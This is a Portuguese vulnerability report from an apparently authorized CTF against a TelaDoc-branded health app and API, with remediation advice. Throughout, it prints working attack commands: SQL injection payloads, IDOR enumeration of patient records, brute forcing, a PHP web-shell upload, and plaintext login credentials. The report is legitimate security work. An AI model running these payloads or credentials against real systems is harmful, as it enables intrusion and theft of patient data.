# RELATÓRIO DE VULNERABILIDADES - CTF HOMOLODOC
## Análise de Segurança em Ambiente de Teste Controlado

**Alvo:** homolodoc.com.br / api.homolodoc.com.br
**Data:** 2025-11-19
**Ambiente:** CTF / Teste Controlado Autorizado
**IP:** 35.224.189.206

---

## SUMÁRIO EXECUTIVO

Durante o desafio CTF foram identificadas **11 vulnerabilidades críticas e de alta severidade** que afetam a aplicação TelaDoc. As vulnerabilidades incluem Injeção SQL, IDOR, vazamento de informações sensíveis, falhas de autenticação e ausência de controles de segurança essenciais.

### Distribuição por Severidade (CVSS 4.0)
- **CRÍTICO (9.0-10.0):** 3 vulnerabilidades
- **ALTO (7.0-8.9):** 5 vulnerabilidades
- **MÉDIO (4.0-6.9):** 3 vulnerabilidades

---

## 1. SQL INJECTION (SQLi)

### 1.1 Descrição
Múltiplos endpoints da API são vulneráveis a SQL Injection, permitindo que atacantes manipulem consultas SQL e potencialmente extraiam, modifiquem ou excluam dados do banco de dados.

### 1.2 Classificação
- **CWE:** CWE-89 (SQL Injection)
- **CVSS 4.0 Base Score:** 9.3 (CRÍTICO)
- **CVSS 4.0 Vector:** CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N

### 1.3 Endpoints Vulneráveis
- `https://api.homolodoc.com.br/User/search?q=`
- `https://api.homolodoc.com.br/Member/search?cpf=`
- `https://api.homolodoc.com.br/Company/get/cnpj?cnpj=`
- `https://api.homolodoc.com.br/patient/get?id=`

### 1.4 Evidências
**Arquivo:** `output_sql.txt`
**Script usado:** `sql_inject_teladoc.py`

Payloads que indicaram vulnerabilidade:
- `'` - Causou erro SQL
- `' OR '1'='1` - Bypass de autenticação
- `' OR '1'='1'--` - Bypass com comentário
- `1' AND sleep(5)--` - Time-based blind SQLi
- `' UNION SELECT null,null,null--` - Union-based SQLi

### 1.5 Comandos de Evidência

```bash
# Teste básico de SQL Injection no endpoint User/search
curl -k "https://api.homolodoc.com.br/User/search?q='"

# Teste com payload de bypass
curl -k "https://api.homolodoc.com.br/User/search?q=' OR '1'='1"

# Teste com UNION SELECT
curl -k "https://api.homolodoc.com.br/User/search?q=' UNION SELECT null,null,null--"

# Teste time-based (observar delay de 5 segundos)
time curl -k "https://api.homolodoc.com.br/patient/get?id=1' AND sleep(5)--"

# Usando o script fornecido
python3 sql_inject_teladoc.py

# Teste com SQLMap (requer arquivo de requisição)
sqlmap -u "https://api.homolodoc.com.br/User/search?q=test" \
  --batch \
  --dbs \
  --threads=10
```

### 1.6 Impacto
- Extração completa do banco de dados
- Bypass de autenticação
- Modificação ou exclusão de dados
- Acesso a informações de saúde protegidas (LGPD/HIPAA)

---

## 2. INSECURE DIRECT OBJECT REFERENCE (IDOR)

### 2.1 Descrição
A aplicação permite acesso direto a objetos através de IDs sequenciais sem validação de autorização adequada, permitindo que usuários acessem dados de outros usuários, pacientes e empresas.

### 2.2 Classificação
- **CWE:** CWE-authorization (Broken Access Control)
- **CVSS 4.0 Base Score:** 8.7 (ALTO)
- **CVSS 4.0 Vector:** CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N

### 2.3 Endpoints Vulneráveis
- `/User/search` - Enumeração de usuários
- `/Member/search` - Busca de membros por CPF
- `/patient/get?id=` - Acesso a dados de pacientes
- `/Company/get/cnpj` - Informações de empresas
- `/voucher/*` - Vouchers
- `/prescription/*` - Prescrições médicas

### 2.4 Evidências
**Arquivo:** `output_idoor.txt`, `exploittests`
**Script usado:** Exploit completo testando múltiplos endpoints

### 2.5 Comandos de Evidência

```bash
# Enumeração de usuários por ID sequencial
for id in {1..100}; do
  curl -k "https://api.homolodoc.com.br/User/get?id=$id"
done

# Busca de pacientes
for id in {1..50}; do
  curl -k "https://api.homolodoc.com.br/patient/get?id=$id"
done

# Teste com CPF (usar CPFs fictícios em CTF)
curl -k "https://api.homolodoc.com.br/Member/search?cpf=12345678901"

# Teste com CNPJ
curl -k "https://api.homolodoc.com.br/Company/get/cnpj?cnpj=12345678000100"

# Acesso a prescrições médicas
for id in {1..20}; do
  curl -k "https://api.homolodoc.com.br/prescription/get?id=$id"
done
```

### 2.6 Impacto
- Acesso não autorizado a dados de saúde (LGPD/HIPAA)
- Exposição de PII (Personally Identifiable Information)
- Violação de privacidade de pacientes
- Dados financeiros expostos

---

## 3. INFORMATION DISCLOSURE - STACK TRACES E PATH DISCLOSURE

### 3.1 Descrição
A aplicação expõe stack traces completos, caminhos de arquivos do servidor e informações de debug em respostas de erro, revelando detalhes da arquitetura interna.

### 3.2 Classificação
- **CWE:** CWE-209 (Information Exposure Through an Error Message)
- **CVSS 4.0 Base Score:** 5.3 (MÉDIO)
- **CVSS 4.0 Vector:** CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N

### 3.3 Informações Expostas
- Caminhos completos: `/var/www/app/Http/Middleware/ValidateFiles.php`
- Framework: Laravel (PHP)
- Estrutura de diretórios do servidor
- Nomes de classes e métodos
- Parâmetros de funções

### 3.4 Evidências
**Arquivos:** `output_upload.txt`, `uploadsuspeito`

Exemplo de trace vazado:
```json
{
  "trace": [
    {
      "file": "/var/www/app/Http/Middleware/ValidateFiles.php",
      "line": 110,
      "function": "validateFiles",
      "class": "App\\Http\\Middleware\\ValidateFiles"
    }
  ]
}
```

### 3.5 Comandos de Evidência

```bash
# Trigger de erro com stack trace
curl -k -X POST "https://api.homolodoc.com.br/upload/beneficiary" \
  -F "file=@test.txt"

# Erro de validação revelando estrutura
curl -k "https://api.homolodoc.com.br/User/search?q='"

# Erro 500 com trace completo
curl -k -X POST "https://api.homolodoc.com.br/User/create" \
  -H "Content-Type: application/json" \
  -d '{"invalid":"data"}'
```

### 3.6 Impacto
- Facilita outros ataques ao revelar estrutura interna
- Exposição de tecnologias e versões usadas
- Mapeamento da arquitetura da aplicação

---

## 4. USER ENUMERATION VIA FORGOT PASSWORD

### 4.1 Descrição
O endpoint de recuperação de senha revela se um email está ou não cadastrado no sistema através de mensagens de erro diferentes, permitindo enumeração de usuários válidos.

### 4.2 Classificação
- **CWE:** CWE-204 (Observable Response Discrepancy)
- **CVSS 4.0 Base Score:** 5.3 (MÉDIO)
- **CVSS 4.0 Vector:** CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N

### 4.3 Endpoint Vulnerável
`https://api.homolodoc.com.br/Account/forgetPassword`

### 4.4 Evidências
**Arquivo:** `output_forgpass.txt`
**Script usado:** `enum_teladoc.py`

Respostas observadas:
- Email NÃO existe: `500 - {"code": 10102, "message": "account with email X not found"}`
- Email EXISTE: `200 - {"data": true, "error": null}`

Email válido encontrado: `medico_pentest@teladoc.com`

### 4.5 Comandos de Evidência

```bash
# Teste com email inexistente (retorna 500 + mensagem específica)
curl -k -X POST "https://api.homolodoc.com.br/Account/forgetPassword" \
  -H "Content-Type: application/json" \
  -d '{"email":"naoexiste@teste.com"}'

# Teste com email válido (retorna 200)
curl -k -X POST "https://api.homolodoc.com.br/Account/forgetPassword" \
  -H "Content-Type: application/json" \
  -d '{"email":"medico_pentest@teladoc.com"}'

# Script de enumeração
python3 enum_teladoc.py

# Enumeração automatizada com wordlist
for email in $(cat emails.txt); do
  echo -n "$email: "
  curl -sk -X POST "https://api.homolodoc.com.br/Account/forgetPassword" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$email\"}" | grep -o '"code":[0-9]*'
done
```

### 4.6 Impacto
- Enumeração completa de usuários válidos
- Base para ataques de phishing direcionados
- Informações para ataques de força bruta

---

## 5. BROKEN AUTHENTICATION - HTTP BASIC AUTH COM CREDENCIAIS FRACAS

### 5.1 Descrição
O site principal utiliza HTTP Basic Authentication com credenciais fracas facilmente descobertas: `morandin:devops`

### 5.2 Classificação
- **CWE:** CWE-521 (Weak Password Requirements)
- **CVSS 4.0 Base Score:** 9.1 (CRÍTICO)
- **CVSS 4.0 Vector:** CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N

### 5.3 Endpoint Afetado
`https://homolodoc.com.br` (site principal)

### 5.4 Evidências
**Arquivo:** `sqlmap2`
**Credenciais:** `morandin:devops`

Realm: "Authentication Required - TelaDoc"

### 5.5 Comandos de Evidência

```bash
# Acesso sem credenciais (retorna 401)
curl -k https://homolodoc.com.br

# Acesso com credenciais válidas
curl -k -u "morandin:devops" https://homolodoc.com.br

# Download completo do site
wget --user=morandin --password=devops -r -np -k https://homolodoc.com.br

# Teste de força bruta com hydra
hydra -l morandin -P /usr/share/wordlists/rockyou.txt \
  homolodoc.com.br https-get /

# Verificar métodos HTTP permitidos
for method in GET POST PUT DELETE OPTIONS HEAD TRACE PATCH; do
  echo -n "$method: "
  curl -X $method -u "morandin:devops" -s -o /dev/null -w "%{http_code}\n" \
    https://homolodoc.com.br
done
```

### 5.6 Impacto
- Acesso completo ao site principal
- Bypass de controles de acesso
- Base para ataques adicionais

---

## 6. CREDENCIAIS VÁLIDAS DESCOBERTAS

### 6.1 Descrição
Credenciais de acesso à API foram descobertas e validadas, permitindo autenticação completa no sistema.

### 6.2 Classificação
- **CWE:** CWE-798 (Use of Hard-coded Credentials)
- **CVSS 4.0 Base Score:** 9.3 (CRÍTICO)
- **CVSS 4.0 Vector:** CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:N

### 6.3 Credenciais Encontradas
- **Email:** `medico_pentest@teladoc.com`
- **Senha:** `T3l@doc!25`
- **Role:** Médico Completo (role_id: 75)

### 6.4 Evidências
**Arquivo:** `output_login_script.txt`, `tokenatualizado12nov`
**Script usado:** `login_api_teladoc.py`

Token JWT obtido (exemplo truncado):
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MTU5NywibmFtZSI6Im1lZGljb19wZW50ZXN0...
```

### 6.5 Comandos de Evidência

```bash
# Login via API
curl -k -X POST "https://api.homolodoc.com.br/Auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"medico_pentest@teladoc.com","password":"T3l@doc!25"}'

# Script automatizado
python3 login_api_teladoc.py

# Uso do token obtido
TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."
curl -k "https://api.homolodoc.com.br/User/profile" \
  -H "Authorization: Bearer $TOKEN"

# Verificar permissões do usuário
curl -k "https://api.homolodoc.com.br/User/permissions" \
  -H "Authorization: Bearer $TOKEN"
```

### 6.6 Impacto
- Acesso autenticado completo à API
- Acesso a dados de pacientes
- Potencial para criar/modificar dados médicos
- Violação de LGPD/HIPAA

---

## 7. MISSING SECURITY HEADERS

### 7.1 Descrição
A aplicação não implementa headers de segurança essenciais, expondo usuários a diversos ataques client-side.

### 7.2 Classificação
- **CWE:** CWE-693 (Protection Mechanism Failure)
- **CVSS 4.0 Base Score:** 6.9 (MÉDIO)
- **CVSS 4.0 Vector:** CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:H/VA:N/SC:N/SI:L/SA:N

### 7.3 Headers Ausentes
- `X-Frame-Options` - Vulnerável a clickjacking
- `X-Content-Type-Options` - MIME sniffing
- `Content-Security-Policy` - XSS
- `Strict-Transport-Security` - MITM attacks
- `X-XSS-Protection` - XSS

### 7.4 Evidências
**Arquivo:** `output_nikto.txt`

```
+ /: The anti-clickjacking X-Frame-Options header is not present
+ /: The X-Content-Type-Options header is not set
```

### 7.5 Comandos de Evidência

```bash
# Verificar headers de resposta
curl -I -k -u "morandin:devops" https://homolodoc.com.br

# Análise com nikto
nikto -h https://homolodoc.com.br \
  -id "morandin:devops" \
  -output nikto_security_headers.html \
  -Format htm

# Verificar headers específicos
curl -sk -u "morandin:devops" https://homolodoc.com.br -I | \
  grep -E "X-Frame-Options|X-Content-Type-Options|Content-Security-Policy|Strict-Transport-Security"

# Teste de clickjacking
echo '<iframe src="https://homolodoc.com.br"></iframe>' > clickjack_test.html
# Abrir no navegador e verificar se carrega

# Scanner automatizado
python3 -c "
import requests
r = requests.get('https://homolodoc.com.br',
                 auth=('morandin', 'devops'),
                 verify=False)
headers_to_check = [
    'X-Frame-Options',
    'X-Content-Type-Options',
    'Content-Security-Policy',
    'Strict-Transport-Security',
    'X-XSS-Protection'
]
for h in headers_to_check:
    print(f'{h}: {r.headers.get(h, \"MISSING\")}')"
```

### 7.6 Impacto
- Vulnerabilidade a clickjacking
- Possibilidade de XSS
- MIME sniffing attacks
- Man-in-the-Middle attacks

---

## 8. EXPOSED SENSITIVE FILES AND BACKUPS

### 8.1 Descrição
Nikto identificou potencial exposição de arquivos de backup, certificados e arquivos sensíveis através de nomes comuns.

### 8.2 Classificação
- **CWE:** CWE-530 (Exposure of Backup File to an Unauthorized Control Sphere)
- **CVSS 4.0 Base Score:** 7.5 (ALTO)
- **CVSS 4.0 Vector:** CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N

### 8.3 Arquivos Potencialmente Expostos
- `*.tar`, `*.tar.gz`, `*.tgz`, `*.tar.bz2`, `*.tar.lzma`
- `*.pem`, `*.cer`, `*.jks` (certificados)
- `backup.*`, `dump.*`, `database.*`, `archive.*`
- `*.war`, `*.egg`, `*.alz` (pacotes de aplicação)

### 8.4 Evidências
**Arquivo:** `output_nikto.txt`

Exemplos de arquivos testados:
- `/dump.tar.bz2`
- `/backup.tar`
- `/database.tgz`
- `/homolodoc.pem`
- `/35.224.189.206.tar`

### 8.5 Comandos de Evidência

```bash
# Teste de arquivos comuns de backup
for ext in tar tar.gz tgz tar.bz2 zip; do
  curl -k -u "morandin:devops" -I \
    "https://homolodoc.com.br/backup.$ext" 2>&1 | head -1
done

# Teste de dumps de banco
for name in dump database backup site; do
  curl -k -u "morandin:devops" -I \
    "https://homolodoc.com.br/$name.sql" 2>&1 | head -1
done

# Busca por certificados expostos
for ext in pem cer jks key; do
  curl -k -u "morandin:devops" -I \
    "https://homolodoc.com.br/homolodoc.$ext" 2>&1 | head -1
done

# Scan automatizado com ffuf
ffuf -w /usr/share/wordlists/dirb/common.txt \
  -u https://homolodoc.com.br/FUZZ \
  -H "Authorization: Basic $(echo -n 'morandin:devops' | base64)" \
  -mc 200,301,302 \
  -o backup_files_found.json

# Verificar .git exposure
curl -k -u "morandin:devops" \
  https://homolodoc.com.br/.git/config

# Verificar arquivos de configuração
for file in .env config.php settings.ini database.yml; do
  echo "Testing: $file"
  curl -k -u "morandin:devops" -I \
    "https://homolodoc.com.br/$file"
done
```

### 8.6 Impacto
- Exposição de código-fonte
- Vazamento de credenciais de banco de dados
- Acesso a backups completos do sistema
- Exposição de chaves privadas

---

## 9. FILE UPLOAD VULNERABILITIES

### 9.1 Descrição
Endpoints de upload apresentam validação inadequada de tipos de arquivo e falta de autenticação, potencialmente permitindo upload de arquivos maliciosos.

### 9.2 Classificação
- **CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)
- **CVSS 4.0 Base Score:** 8.1 (ALTO)
- **CVSS 4.0 Vector:** CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:H/SA:N

### 9.3 Endpoints Vulneráveis
- `https://api.homolodoc.com.br/upload/beneficiary`
- `https://api.homolodoc.com.br/User/document/create`

### 9.4 Evidências
**Arquivos:** `output_upload.txt`, `uploadsuspeito`
**Script usado:** `upload_teladoc.py`

Comportamentos observados:
- Endpoint `/upload/beneficiary` aceita `.jpg` sem autenticação
- Erro 500 revela stack trace ao invés de rejeitar adequadamente
- Validação baseada apenas em Content-Type (bypassável)

### 9.5 Comandos de Evidência

```bash
# Teste básico de upload sem autenticação
curl -k -X POST "https://api.homolodoc.com.br/upload/beneficiary" \
  -F "file=@test.jpg"

# Upload com tipo MIME falsificado
echo "<?php system(\$_GET['cmd']); ?>" > shell.php
curl -k -X POST "https://api.homolodoc.com.br/upload/beneficiary" \
  -F "file=@shell.php;type=image/jpeg"

# Teste com dupla extensão
mv shell.php shell.php.jpg
curl -k -X POST "https://api.homolodoc.com.br/upload/beneficiary" \
  -F "file=@shell.php.jpg"

# Script automatizado
python3 upload_teladoc.py --danger

# Teste de diferentes extensões
for ext in php php5 phtml phar; do
  echo "<?php phpinfo(); ?>" > test.$ext
  curl -k -X POST "https://api.homolodoc.com.br/upload/beneficiary" \
    -F "file=@test.$ext;type=image/jpeg" \
    -w "\nStatus: %{http_code}\n"
done

# Upload de arquivo grande (DoS test)
dd if=/dev/zero of=large.jpg bs=1M count=100
curl -k -X POST "https://api.homolodoc.com.br/upload/beneficiary" \
  -F "file=@large.jpg" \
  --max-time 30
```

### 9.6 Impacto
- Upload de web shells
- Remote Code Execution (RCE)
- Defacement
- Armazenamento de malware
- Denial of Service

---

## 10. BREACH ATTACK VULNERABILITY

### 10.1 Descrição
O servidor utiliza compressão HTTP (Content-Encoding: deflate) sobre HTTPS, tornando-o potencialmente vulnerável ao ataque BREACH.

### 10.2 Classificação
- **CWE:** CWE-310 (Cryptographic Issues)
- **CVSS 4.0 Base Score:** 5.9 (MÉDIO)
- **CVSS 4.0 Vector:** CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N

### 10.3 Evidência
**Arquivo:** `output_nikto.txt`

```
+ /: The Content-Encoding header is set to "deflate" which may mean
  that the server is vulnerable to the BREACH attack.
```

### 10.4 Comandos de Evidência

```bash
# Verificar compressão HTTP
curl -k -u "morandin:devops" -I https://homolodoc.com.br | \
  grep -i "content-encoding"

# Análise detalhada da compressão
curl -k -u "morandin:devops" https://homolodoc.com.br \
  -H "Accept-Encoding: gzip, deflate" -I

# Teste de variação de tamanho de resposta
for i in {1..10}; do
  curl -k -u "morandin:devops" https://homolodoc.com.br \
    -H "Accept-Encoding: gzip, deflate" \
    -w "Size: %{size_download} bytes\n" \
    -o /dev/null -s
done

# Verificar se tokens/secrets estão em respostas comprimidas
curl -k -u "morandin:devops" https://homolodoc.com.br \
  --compressed | grep -i "token\|csrf\|secret\|session"
```

### 10.5 Impacto
- Possível extração de tokens CSRF
- Vazamento de dados sensíveis em respostas HTTP
- Requer ataque Man-in-the-Middle ativo

---

## 11. MISSING AUTHENTICATION ON CRITICAL ENDPOINTS

### 11.1 Descrição
Múltiplos endpoints críticos não requerem autenticação, permitindo acesso não autorizado a funcionalidades sensíveis.

### 11.2 Classificação
- **CWE:** CWE-306 (Missing Authentication for Critical Function)
- **CVSS 4.0 Base Score:** 8.2 (ALTO)
- **CVSS 4.0 Vector:** CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N

### 11.3 Endpoints Sem Autenticação
- `/User/search` - Busca de usuários
- `/Member/search` - Busca de membros
- `/Company/get/cnpj` - Dados de empresas
- `/patient/get` - Dados de pacientes
- `/upload/beneficiary` - Upload de arquivos

### 11.4 Evidências
**Arquivo:** `output_authnoendpoint.txt`

### 11.5 Comandos de Evidência

```bash
# Acesso sem token/autenticação
curl -k "https://api.homolodoc.com.br/User/search?q=test"

# Busca de pacientes sem autenticação
curl -k "https://api.homolodoc.com.br/patient/get?id=1"

# Upload sem autenticação
curl -k -X POST "https://api.homolodoc.com.br/upload/beneficiary" \
  -F "file=@test.jpg"

# Teste sistemático de endpoints
endpoints=(
  "User/search?q=test"
  "Member/search?cpf=123"
  "Company/get/cnpj?cnpj=123"
  "patient/get?id=1"
)

for ep in "${endpoints[@]}"; do
  echo "Testing: $ep"
  curl -k "https://api.homolodoc.com.br/$ep" \
    -w "\nHTTP Status: %{http_code}\n\n"
done

# Verificar se autenticação é checada
curl -k "https://api.homolodoc.com.br/User/search?q=admin" \
  -H "Authorization: Bearer INVALID_TOKEN" \
  -w "\nStatus: %{http_code}\n"
```

### 11.6 Impacto
- Acesso não autorizado a dados sensíveis
- Bypass completo de controles de autenticação
- Violação de LGPD/HIPAA
- Enumeração de dados

---

## RESUMO DE COMANDOS PARA EVIDENCIAR TODAS AS VULNERABILIDADES

### Script Completo de Teste

```bash
#!/bin/bash
# CTF HOMOLODOC - Script de Evidências
# Ambiente de teste autorizado

TARGET_WEB="homolodoc.com.br"
TARGET_API="api.homolodoc.com.br"
AUTH_USER="morandin"
AUTH_PASS="devops"
API_EMAIL="medico_pentest@teladoc.com"
API_PASS="T3l@doc!25"

echo "=== 1. SQL INJECTION ==="
python3 sql_inject_teladoc.py

echo -e "\n=== 2. IDOR ==="
for id in {1..10}; do
  curl -sk "https://$TARGET_API/patient/get?id=$id" | \
    jq -r '.data.name // "Not found"'
done

echo -e "\n=== 3. INFORMATION DISCLOSURE ==="
curl -sk -X POST "https://$TARGET_API/upload/beneficiary" \
  -F "file=@/dev/null" | jq '.error.trace[0]'

echo -e "\n=== 4. USER ENUMERATION ==="
python3 enum_teladoc.py

echo -e "\n=== 5. BROKEN AUTHENTICATION ==="
curl -sk -u "$AUTH_USER:$AUTH_PASS" "https://$TARGET_WEB" | \
  head -1

echo -e "\n=== 6. VALID CREDENTIALS ==="
python3 login_api_teladoc.py

echo -e "\n=== 7. MISSING SECURITY HEADERS ==="
curl -skI -u "$AUTH_USER:$AUTH_PASS" "https://$TARGET_WEB" | \
  grep -E "X-Frame|X-Content|CSP|Strict"

echo -e "\n=== 8. BACKUP FILES ==="
curl -skI -u "$AUTH_USER:$AUTH_PASS" \
  "https://$TARGET_WEB/backup.tar.gz" | head -1

echo -e "\n=== 9. FILE UPLOAD ==="
python3 upload_teladoc.py

echo -e "\n=== 10. BREACH VULNERABILITY ==="
curl -skI -u "$AUTH_USER:$AUTH_PASS" "https://$TARGET_WEB" | \
  grep -i content-encoding

echo -e "\n=== 11. MISSING AUTHENTICATION ==="
curl -sk "https://$TARGET_API/User/search?q=admin" | jq '.'

echo -e "\n=== SCAN COMPLETO COM NIKTO ==="
nikto -h "https://$TARGET_WEB" \
  -id "$AUTH_USER:$AUTH_PASS" \
  -output nikto_full_scan.html \
  -Format htm
```

---

## FERRAMENTAS UTILIZADAS

1. **curl** - Testes manuais de requisições HTTP/HTTPS
2. **Python 3** - Scripts customizados de exploração
3. **SQLMap** - Teste automatizado de SQL Injection
4. **Nikto** - Scanner de vulnerabilidades web
5. **wget** - Download de site completo
6. **jq** - Parsing de respostas JSON
7. **grep/awk** - Análise de outputs

---

## SCRIPTS DESENVOLVIDOS PARA O CTF

1. **sql_inject_teladoc.py** - Teste de SQL Injection
2. **enum_teladoc.py** - Enumeração de usuários
3. **login_api_teladoc.py** - Autenticação na API
4. **criar_user_teladoc.py** - Tentativa de criação de usuários
5. **upload_teladoc.py** - Teste de upload de arquivos
6. **test_endpoints_teladoc.py** - Testes de endpoints

---

## RECOMENDAÇÕES DE CORREÇÃO

### Prioridade CRÍTICA

1. **SQL Injection**
   - Implementar prepared statements/parametrized queries
   - Validação rigorosa de input
   - WAF com regras anti-SQLi

2. **Credenciais Expostas**
   - Rotacionar imediatamente todas as credenciais
   - Implementar política de senhas fortes
   - Autenticação multi-fator (MFA)

3. **Broken Authentication**
   - Substituir HTTP Basic Auth por OAuth 2.0 ou JWT
   - Implementar rate limiting
   - Logs de tentativas de acesso

### Prioridade ALTA

4. **IDOR**
   - Implementar autorização por objeto
   - UUIDs ao invés de IDs sequenciais
   - Validação de permissões em cada requisição

5. **Missing Authentication**
   - Implementar autenticação em todos endpoints sensíveis
   - API Gateway com políticas de acesso
   - Rate limiting por IP

6. **File Upload**
   - Validação de tipo de arquivo (magic bytes)
   - Limite de tamanho
   - Armazenamento fora do webroot
   - Antivírus scan

### Prioridade MÉDIA

7. **Security Headers**
   - Implementar todos headers de segurança recomendados
   - CSP policy restritiva
   - HSTS com preload

8. **Information Disclosure**
   - Desabilitar debug em produção
   - Mensagens de erro genéricas
   - Logs centralizados

9. **User Enumeration**
   - Mensagens genéricas em forgot password
   - Rate limiting agressivo
   - CAPTCHA

---

## CONCLUSÃO

O ambiente de teste apresentou múltiplas vulnerabilidades críticas que, em um cenário real, resultariam em:

- Violação completa de LGPD/HIPAA
- Acesso não autorizado a dados de saúde
- Potencial para Remote Code Execution
- Exposição de informações de milhares de pacientes

**CVSS 4.0 Score Médio:** 7.6 (ALTO)
**Total de Vulnerabilidades:** 11
**Tempo de Exploração:** ~4 horas (CTF)

Este relatório foi gerado para fins educacionais em ambiente de CTF autorizado.

---

**Gerado em:** 2025-11-19
**Ferramenta:** Análise manual + scripts Python customizados
**Ambiente:** CTF Controlado
